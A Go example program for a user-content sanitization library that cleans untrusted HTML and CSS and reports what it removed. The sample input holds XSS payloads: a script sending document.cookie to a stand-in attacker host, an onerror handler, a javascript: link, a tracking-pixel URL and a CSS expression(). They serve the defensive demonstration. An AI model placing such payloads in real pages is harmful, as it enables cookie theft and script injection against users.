// Example 01: sanitize untrusted HTML and CSS.
//
// The smallest thing that works. Build a Sanitizer once from a
// profile, then call it per request — it is stateless after
// construction and safe for concurrent use.
//
//	go run ./examples/01-basic
package main

import (
	"fmt"
	"log"

	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent"
	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent/profiles"
)

func main() {
	// One Sanitizer for the life of the process. New() rejects a
	// profile that violates the package's invariants, so a
	// misconfiguration fails at startup rather than at request time.
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		log.Fatal(err)
	}

	const untrustedHTML = `
		<h1>My page</h1>
		<p>Hello <strong>world</strong>.</p>
		<script>fetch('https://evil.example.com/?c='+document.cookie)</script>
		<img src="x" onerror="alert(1)">
		<a href="javascript:alert(1)">click me</a>
		<a href="/about">a real link</a>`

	const untrustedCSS = `
		h1 { color: navy; font-size: 2rem }
		@media (min-width: 600px) { h1 { font-size: 3rem } }
		body { background: url("https://evil.example.com/pixel.gif") }
		p { width: expression(alert(1)) }`

	html, htmlReport, err := s.SanitizeHTML(untrustedHTML)
	if err != nil {
		// An error means the input was rejected outright — too large,
		// too deeply nested, or containing forbidden characters. The
		// returned string is always empty in that case, so there is
		// nothing here that could be served by accident.
		log.Fatalf("html rejected: %v", err)
	}

	css, cssReport, err := s.SanitizeCSS(untrustedCSS)
	if err != nil {
		log.Fatalf("css rejected: %v", err)
	}

	fmt.Println("=== sanitized HTML ===")
	fmt.Println(html)
	fmt.Printf("\n%d element(s) removed\n", len(htmlReport.Removed))

	fmt.Println("\n=== sanitized CSS ===")
	fmt.Println(css)
	fmt.Printf("\n%d rule(s) removed\n", len(cssReport.Removed))

	// Both outputs are safe to insert into a trusted page:
	//   template.HTML(html)  — inert: no script, no handlers, no
	//                          javascript: URLs
	//   template.CSS(css)    — contains no literal '<', so it cannot
	//                          close the <style> element it goes in
	//
	// And both are idempotent: re-sanitizing returns them unchanged,
	// which is what makes it safe to store the output and re-run it
	// through a future, stricter policy.
	again, _, _ := s.SanitizeHTML(html)
	fmt.Printf("\nidempotent: %v\n", again == html)
}
